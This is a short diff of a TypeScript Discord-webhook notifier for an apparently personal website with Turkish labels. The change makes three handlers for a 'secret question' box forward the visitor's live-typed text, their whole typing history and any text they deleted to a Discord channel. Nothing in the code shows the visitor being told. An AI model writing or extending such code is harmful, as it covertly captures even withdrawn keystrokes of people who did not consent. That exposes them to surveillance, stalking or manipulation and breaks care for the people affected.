@@ -134,15 +134,15 @@ export async function sendDiscordWebhook(
     } else if (eventType === 'secret_input_typed' || eventType === 'secret_input_draft') {
       title = '✍️ Gizli Soruya Canlı Yazılıyor...';
       color = 3801080; // Sky Blue #3a86ff
-      description = 'Ziyaretçi "Ne görmek istiyorsun?" sorusuna canlı olarak metin yazıyor:';
+      description = `✍️ **Ziyaretçi "Ne görmek istiyorsun?" sorusuna canlı yazıyor:**\n\n**"${data.letterText || data.answer || '-'}"**\n\n🔤 **Tüm Yazılanlar (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
     } else if (eventType === 'secret_input_submitted') {
       title = '📩 GİZLİ SORUYA CEVAP GÖNDERİLDİ!';
       color = 16723558; // Bright Crimson #ff1493
-      description = 'Ziyaretçi "Ne görmek istiyorsun?" sorusunun altına cevabını yazdı ve gönderdi!';
+      description = `📩 **Ziyaretçi "Ne görmek istiyorsun?" sorusuna cevabını gönderdi:**\n\n**"${data.letterText || data.answer || '-'}"**\n\n🔤 **Tüm Yazılanlar (Silinenler Dahil):** "${data.allTypedHistory || data.letterText || '-'}"${data.deletedText ? `\n✂️ **Silinen Kısımlar:** "${data.deletedText}"` : ''}`;
     } else if (eventType === 'secret_input_deleted') {
       title = '✂️ Gizli Sorudaki Yazı Silindi / Temizlendi';
       color = 16478608; // Rose #fb7185
-      description = 'Ziyaretçi yazmış olduğu metni sildi veya geri aldı:';
+      description = `✂️ **Ziyaretçi yazmış olduğu metni sildi:**\n\n✂️ **Silinen Kısım:** "${data.deletedText || '-'}"\n📝 **Kalan Metin:** "${data.letterText || '-'}"\n🔤 **Tüm Yazılanlar:** "${data.allTypedHistory || '-'}"`;
     } else if (eventType === 'food_input_typed') {
       title = '💬 Yemek Kutusuna Cevap Yazıldı';
       color = 16750848; // Orange #fa8c16
